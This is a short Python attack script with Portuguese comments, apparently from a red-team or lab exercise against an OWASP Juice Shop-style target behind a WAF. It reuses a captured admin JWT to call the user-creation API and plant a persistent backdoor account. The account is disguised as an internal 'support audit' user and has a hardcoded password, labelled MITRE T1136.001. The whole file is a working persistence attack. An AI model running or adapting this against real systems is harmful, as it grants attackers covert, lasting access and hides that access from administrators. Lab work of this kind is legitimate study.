import requests
import json

# --- Inteligência de Sessão ---
TARGET_BASE = "http://defense-waf:8080"
# O token que você capturou no passo anterior
ADMIN_TOKEN = "eyJ0eXAiOiJKV1QiLCJh..." # Insira o token completo aqui

def establish_persistence():
    """T1136.001: Create Account - Local Account como Backdoor"""
    print("[*] Iniciando Fase de Persistência (T1136)...")
    
    url = f"{TARGET_BASE}/api/Users"
    headers = {
        "Authorization": f"Bearer {ADMIN_TOKEN}",
        "Content-Type": "application/json"
    }
    
    # Criando um usuário persistente que parece inofensivo
    backdoor_data = {
        "email": "support_audit_internal@juice-sh.op",
        "password": "MetatronPersistence2026!",
        "passwordRepeat": "MetatronPersistence2026!",
        "securityQuestion": {
            "id": 1,
            "answer": "Metatron"
        }
    }

    try:
        res = requests.post(url, json=backdoor_data, headers=headers, timeout=5)
        
        if res.status_code == 201:
            print("[!!!] PERSISTÊNCIA ESTABELECIDA: Usuário de backdoor criado com sucesso.")
            print(f"    [+] Credencial: {backdoor_data['email']}")
        elif res.status_code == 401:
            print("[-] Erro: O Token JWT expirou ou é inválido.")
        elif res.status_code == 403:
            print("[🛡️] WAF/ACL: Acesso negado à API de criação de usuários.")
        else:
            print(f"[*] Resposta do Servidor: {res.status_code} - {res.text[:100]}")
            
    except Exception as e:
        print(f"[-] Falha crítica na comunicação: {e}")

if __name__ == "__main__":
    establish_persistence()
